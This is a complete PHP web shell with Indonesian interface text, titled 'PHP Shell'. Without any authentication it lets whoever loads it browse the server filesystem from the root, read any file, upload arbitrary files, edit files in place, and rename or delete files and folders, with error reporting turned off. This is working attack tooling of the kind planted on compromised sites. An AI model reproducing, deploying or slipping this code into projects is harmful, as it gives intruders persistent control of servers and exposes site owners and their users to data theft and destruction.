<?php
error_reporting(0);
set_time_limit(0);

function list_dir($path) {
    $files = scandir($path);
    $dirs = [];
    $fils = [];

    foreach ($files as $file) {
        if ($file == ".") continue;
        $fullPath = $path . "/" . $file;
        is_dir($fullPath) ? $dirs[] = $file : $fils[] = $file;
    }

    $sorted = array_merge($dirs, $fils);

    echo "<table border=1 cellpadding=5 cellspacing=0 style='width:100%; font-size:14px;'>";
    echo "<tr style='color:lime'><th>Nama</th><th>Ukuran</th><th>Terakhir Diubah</th><th>Aksi</th></tr>";

    foreach ($sorted as $file) {
        $fullPath = $path . "/" . $file;
        $mod = date("Y-m-d H:i:s", filemtime($fullPath));
        $size = is_file($fullPath) ? filesize($fullPath) . " B" : "-";
        $color = is_dir($fullPath) ? "red" : "lime";
        echo "<tr style='color:$color'>";
        echo "<td><a href='?path=" . urlencode($fullPath) . "' style='color:$color'>$file</a></td>";
        echo "<td>$size</td>";
        echo "<td>$mod</td>";
        echo "<td>
            <a href='?path=" . urlencode(dirname($fullPath)) . "&edit=" . urlencode($fullPath) . "' style='color:white'>Edit</a> |
            <a href='?path=" . urlencode(dirname($fullPath)) . "&rename=" . urlencode($fullPath) . "' style='color:white'>Rename</a> |
            <a href='?path=" . urlencode(dirname($fullPath)) . "&delete=" . urlencode($fullPath) . "' style='color:white' onclick='return confirm(\"Yakin hapus?\")'>Delete</a>
        </td>";
        echo "</tr>";
    }

    echo "</table>";
}

function breadcrumbs($path) {
    $parts = explode("/", trim($path, "/"));
    $crumb = "";
    echo "<div style='margin-bottom:10px;'>";
    echo "<a href='?path=/' style='color:lime'>/</a>";
    foreach ($parts as $part) {
        if ($part == "") continue;
        $crumb .= "/$part";
        echo "<a href='?path=" . urlencode($crumb) . "' style='color:lime'>/$part</a>";
    }
    echo "</div>";
}

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);

// Jika path adalah file, tampilkan isi file dan opsi
if (is_file($path)) {
    echo "<html><head><title>View File</title></head>
    <body style='background:black; color:lime; font-family:monospace; padding:10px'>";
    echo "<h2 style='color:red'>View File: " . basename($path) . "</h2>";
    breadcrumbs(dirname($path));

    $ext = pathinfo($path, PATHINFO_EXTENSION);
    $content = htmlspecialchars(file_get_contents($path));

    echo "<pre style='background:#111; padding:10px; overflow:auto; max-height:500px;'>" . 
        ($ext === "php" ? highlight_string(file_get_contents($path), true) : $content) . 
    "</pre>";

    // Tombol aksi
    $baseurl = "?path=" . urlencode(dirname($path));
    echo "<div style='margin-top:10px;'>
        <a href='{$baseurl}&edit=" . urlencode($path) . "' style='color:white'>[Edit]</a> |
        <a href='{$baseurl}&rename=" . urlencode($path) . "' style='color:white'>[Rename]</a> |
        <a href='{$baseurl}&delete=" . urlencode($path) . "' style='color:white' onclick='return confirm(\"Yakin hapus?\")'>[Delete]</a>
    </div>";

    echo "</body></html>";
    exit;
}

echo "<html><head><title>PHP Shell</title></head>
<body style='background:black; color:lime; font-family:monospace; margin:0; padding:10px; width:100vw; height:100vh; overflow:auto'>";
echo "<h2 style='color:red'>PHP Shell</h2>";

breadcrumbs($path);

// Upload form
echo "<form method='POST' enctype='multipart/form-data'>
    <input type='file' name='upload'>
    <input type='submit' name='doUpload' value='Upload'>
</form>";

if (isset($_POST['doUpload'])) {
    $dest = $path . "/" . $_FILES['upload']['name'];
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        echo "<p style='color:lime'>Upload berhasil: {$_FILES['upload']['name']}</p>";
    } else {
        echo "<p style='color:red'>Gagal upload!</p>";
    }
}

if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if (is_file($file)) {
        if (isset($_POST['save'])) {
            file_put_contents($file, $_POST['content']);
            echo "<p style='color:lime'>File disimpan!</p>";
        }
        $content = htmlspecialchars(file_get_contents($file));
        echo "<form method='POST'>
            <textarea name='content' style='width:100%; height:300px;'>$content</textarea><br>
            <input type='submit' name='save' value='Simpan'>
        </form>";
        exit;
    }
}

if (isset($_GET['rename'])) {
    $file = $_GET['rename'];
    if (isset($_POST['newname'])) {
        $newPath = dirname($file) . "/" . $_POST['newname'];
        if (rename($file, $newPath)) {
            echo "<p style='color:lime'>Berhasil rename!</p>";
        } else {
            echo "<p style='color:red'>Gagal rename!</p>";
        }
    }
    echo "<form method='POST'>
        <input type='text' name='newname' value='" . basename($file) . "'>
        <input type='submit' value='Rename'>
    </form>";
    exit;
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (is_file($file)) {
        unlink($file) ? print("<p style='color:lime'>File dihapus</p>") : print("<p style='color:red'>Gagal hapus</p>");
    } elseif (is_dir($file)) {
        rmdir($file) ? print("<p style='color:lime'>Folder dihapus</p>") : print("<p style='color:red'>Gagal hapus folder</p>");
    }
}

list_dir($path);

echo "</body></html>";
?>